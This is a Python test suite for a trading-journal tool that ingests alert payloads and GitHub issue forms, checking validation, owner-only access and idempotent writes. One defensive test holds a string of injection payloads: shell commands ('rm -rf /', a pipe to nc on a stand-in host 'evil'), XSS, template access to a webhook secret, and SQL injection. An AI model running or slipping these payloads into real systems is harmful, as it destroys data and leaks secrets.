"""Alert dispatch ingest + issue-form ingest, including injection safety and owner-only enforcement."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from odj.journal import issue_forms, store
from odj.journal.ingest import ingest_alert_event, ingest_alert_payload, ingest_issue_event
from tests.helpers import alert

ALERT_ID = alert()["id"]


@pytest.fixture
def sent(monkeypatch: pytest.MonkeyPatch) -> list[tuple[str, str]]:
    box: list[tuple[str, str]] = []
    monkeypatch.setattr(
        "odj.journal.ingest.discord_post",
        lambda msg, level="info": box.append((level, msg)) or True,
    )
    return box


# ------------------------------------------------------------------ repository_dispatch alerts


def test_valid_alert_is_written_and_confirmed(root: Path, sent: list[tuple[str, str]]) -> None:
    out = ingest_alert_payload(root, json.dumps(alert()))
    assert out.ok and out.created and out.record_id == ALERT_ID
    assert store.get(root, "alert", ALERT_ID) is not None
    assert (
        sent
        and sent[0][0] == "info"
        and ALERT_ID in sent[0][1]
        and len(sent[0][1].splitlines()) == 1
    )


def test_duplicate_dispatch_is_harmless(root: Path, sent: list[tuple[str, str]]) -> None:
    ingest_alert_payload(root, json.dumps(alert()))
    out = ingest_alert_payload(root, json.dumps(alert()))
    assert out.ok and not out.created and len(store.read_all(root, "alert")) == 1


@pytest.mark.parametrize(
    "payload",
    [
        json.dumps(alert(structure="made_up")),
        json.dumps({k: v for k, v in alert().items() if k != "legs"}),
        "{not json",
        "[1, 2, 3]",
        json.dumps(alert(confidence_score=500)),
        "x" * 300_000,
    ],
)
def test_invalid_alerts_are_rejected_loudly_and_never_written(
    root: Path, sent: list[tuple[str, str]], payload: str
) -> None:
    out = ingest_alert_payload(root, payload)
    assert not out.ok
    assert sent and sent[-1][0] == "fail" and "rejected alert" in sent[-1][1]
    assert not (root / "journal").exists() or store.read_all(root, "alert") == []


def test_alert_via_event_file_uses_single_json_string_property(
    root: Path, sent: list[tuple[str, str]], tmp_path: Path
) -> None:
    ev = tmp_path / "event.json"
    ev.write_text(json.dumps({"action": "alert", "client_payload": {"alert": json.dumps(alert())}}))
    assert ingest_alert_event(root, ev).ok
    ev.write_text(json.dumps({"action": "alert", "client_payload": {"other": 1}}))
    out = ingest_alert_event(root, ev)
    assert not out.ok and sent[-1][0] == "fail"


def test_alert_dry_run_validates_without_writing(root: Path) -> None:
    out = ingest_alert_payload(root, json.dumps(alert()), notify=False, dry_run=True)
    assert out.ok and not out.created and "not written" in out.message
    assert not (root / "journal/alerts").exists() or not list(
        (root / "journal/alerts").glob("*.jsonl")
    )


# ------------------------------------------------------------------------------- issue forms


def body(**fields: str) -> str:
    order = [
        "Alert ID",
        "Filled at (UTC)",
        "Legs",
        "Contracts",
        "Net price per share",
        "Fees total (USD)",
        "Order type",
        "Limit price",
        "Notes",
        "Test record",
    ]
    vals = {
        "Alert ID": ALERT_ID,
        "Filled at (UTC)": "",
        "Legs": "",
        "Contracts": "2",
        "Net price per share": "0.85",
        "Fees total (USD)": "1.30",
        "Order type": "limit",
        "Limit price": "",
        "Notes": "",
        "Test record": "",
    }
    vals.update(fields)
    return "\n\n".join(f"### {k}\n\n{vals[k] or '_No response_'}" for k in order)


def event(
    b: str, *, label: str = "log-fill", login: str = "samedame", number: int = 41
) -> dict[str, Any]:
    return {
        "issue": {
            "number": number,
            "user": {"login": login},
            "labels": [{"name": label}],
            "body": b,
            "created_at": "2026-11-02T14:40:00Z",
        },
        "repository": {"owner": {"login": "samedame"}},
    }


def seeded(root: Path) -> None:
    store.append(root, "alert", alert())


def test_fill_from_issue_copies_legs_and_reports_slippage(
    root: Path, sent: list[tuple[str, str]]
) -> None:
    seeded(root)
    out = ingest_issue_event(root, event(body()))
    assert out.ok and out.kind == "fill" and out.created
    f = store.get(root, "fill", "fill-gh41")
    assert (
        f is not None
        and f["legs_actual"][0]["strike"] == 530.0
        and f["source"] == "issue"
        and f["ts_utc"] == "2026-11-02T14:40:00Z"
    )
    assert (
        "-0.05/share" in out.message
        and "-5.00 USD/contract" in out.message
        and "-5.6% of alert premium" in out.message
    )
    assert "% of max loss" in out.message


def test_fill_with_explicit_legs_and_time(root: Path) -> None:
    seeded(root)
    legs = "sell put 530 2026-11-20\nbuy put 525 2026-11-20"
    out = ingest_issue_event(
        root,
        event(
            body(
                Legs=legs,
                **{"Filled at (UTC)": "2026-11-02T09:41:00-05:00", "Order type": "market"},
            )
        ),
        notify=False,
    )
    assert out.ok
    f = store.get(root, "fill", "fill-gh41")
    assert f and f["ts_utc"] == "2026-11-02T14:41:00Z" and f["order_type"] == "market"


def test_exit_resolves_fill_from_alert_and_skip_works(root: Path) -> None:
    seeded(root)
    ingest_issue_event(root, event(body()), notify=False)
    exit_body = (
        "### Fill ID\n\n_No response_\n\n### Alert ID (if Fill ID unknown)\n\n"
        + ALERT_ID
        + "\n\n### Exited at (UTC)\n\n2026-11-10T15:00:00Z\n\n### Contracts\n\n2\n\n### Net price per share\n\n-0.25\n\n### Fees total (USD)\n\n1.3\n\n### Exit reason\n\nprofit_target\n\n### Notes\n\n_No response_\n\n### Test record\n\n_No response_"
    )
    out = ingest_issue_event(root, event(exit_body, label="log-exit", number=42), notify=False)
    assert out.ok and store.get(root, "exit", "exit-gh42")["fill_id"] == "fill-gh41"  # type: ignore[index]
    skip_body = f"### Alert ID\n\n{ALERT_ID}\n\n### Skip reason\n\nrisk_gate\n\n### Skipped at (UTC)\n\n_No response_\n\n### Notes\n\n_No response_\n\n### Test record\n\n- [x] This is a test record"
    out = ingest_issue_event(root, event(skip_body, label="log-skip", number=43), notify=False)
    assert out.ok and store.get(root, "skip", "skip-gh43")["test"] is True  # type: ignore[index]


@pytest.mark.parametrize(
    ("override", "needle"),
    [
        ({"Contracts": "two"}, "whole number"),
        ({"Net price per share": "cheap"}, "must be a number"),
        ({"Alert ID": "ghost-20260101T000000Z-1"}, "unknown Alert ID"),
        ({"Contracts": "0"}, "contracts"),
        ({"Legs": "short a put please"}, "cannot parse leg line"),
        ({"Filled at (UTC)": "yesterday"}, "ISO-8601"),
        ({"Order type": "teleport"}, "order_type"),
    ],
)
def test_bad_forms_comment_the_error_and_write_nothing(
    root: Path, override: dict[str, str], needle: str
) -> None:
    seeded(root)
    out = ingest_issue_event(root, event(body(**override)), notify=False)
    assert not out.ok and needle in out.message and "Nothing was written" in out.message
    assert store.read_all(root, "fill") == []


def test_only_the_repository_owner_is_served(root: Path) -> None:
    seeded(root)
    out = ingest_issue_event(root, event(body(), login="mallory"), notify=False)
    assert not out.ok and out.errors == ["not owner"]
    assert store.read_all(root, "fill") == []
    spoof = event(body(), login="SameDame")  # case-insensitive match is fine
    assert ingest_issue_event(root, spoof, notify=False).ok


def test_ambiguous_or_mislabelled_forms_are_refused(root: Path) -> None:
    seeded(root)
    out = ingest_issue_event(root, event(body(), label="log-skip"), notify=False)
    assert not out.ok and store.read_all(root, "skip") == []


def test_reprocessing_the_same_issue_changes_nothing(root: Path) -> None:
    seeded(root)
    first = ingest_issue_event(root, event(body()), notify=False)
    second = ingest_issue_event(root, event(body()), notify=False)
    assert first.created and second.ok and not second.created
    assert len(store.read_all(root, "fill")) == 1


NASTY = (
    "$(touch @@P@@/pwned1) `touch @@P@@/pwned2`; rm -rf / && echo hi | nc evil 1337\n"
    "[click](javascript:alert(1)) <script>alert(1)</script> <details open> @everyone @samedame\n"
    "{{ 7*7 }} ${{ secrets.DISCORD_WEBHOOK_URL }} %(foo)s {0.__class__} \\x00 ‮ RTL\n"
    "\"; DROP TABLE fills; --  ' OR '1'='1\n"
    "---\nid: injected\n---"
)


def test_injection_attempts_are_stored_as_inert_text(root: Path, tmp_path: Path) -> None:
    seeded(root)
    notes = NASTY.replace("@@P@@", str(tmp_path))
    out = ingest_issue_event(root, event(body(Notes=notes)), notify=False)
    assert out.ok
    stored = store.get(root, "fill", "fill-gh41")
    assert stored is not None and stored["notes"] == notes.strip()  # byte-for-byte inert
    assert not (tmp_path / "pwned1").exists() and not (tmp_path / "pwned2").exists()
    assert (
        "touch" not in out.message and "script" not in out.message
    )  # never echoed into the comment
    line = (root / "journal/fills/2026-11.jsonl").read_text().strip()
    assert (
        json.loads(line)["notes"] == notes.strip() and "\n" not in line
    )  # one JSON line, newlines escaped
    assert (
        stored["id"] == "fill-gh41" and stored["contracts"] == 2
    )  # frontmatter-looking text changed nothing


def test_field_spoofing_inside_free_text_is_rejected(root: Path) -> None:
    seeded(root)
    notes = "harmless\n### Contracts\n\n999\n### Test record\n\n- [x] test"
    out = ingest_issue_event(root, event(body(Notes=notes)), notify=False)
    assert not out.ok and "more than once" in out.message
    assert store.read_all(root, "fill") == []


def test_parse_sections_handles_windows_newlines_and_no_response() -> None:
    s = issue_forms.parse_sections("### A\r\n\r\nvalue\r\n\r\n### B\r\n\r\n_No response_\r\n")
    assert s == {"A": "value", "B": ""}
    assert issue_forms.parse_legs("BUY CALL 560.5 2026-12-18 x2\nsell stock")[0]["ratio"] == 2
